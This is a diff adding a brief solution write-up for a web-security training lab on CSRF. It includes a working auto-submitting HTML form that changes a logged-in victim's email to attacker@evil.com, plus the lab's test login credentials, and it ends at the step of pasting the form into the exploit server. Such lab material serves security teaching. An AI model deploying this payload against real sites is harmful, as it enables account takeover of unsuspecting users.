@@ -1,0 +1,34 @@
+// Lab: CSRF vulnerability with no defenses
+
+This lab's email change functionality is vulnerable to CSRF.
+
+To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+// Solution
+
+1. Let's login as given credentials
+
+2. Then craft the HTML exploit
+
+// exploit
+
+<form
+  method="POST"
+  action="https://0af800bf04fa99a880f7033e008600b4.web-security-academy.net/my-account/change-email"
+>
+  <input
+    type="hidden"
+    name="email"
+    value="attacker@evil.com"
+  />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
+
+3. then open the exploit server and Inject this in the body section
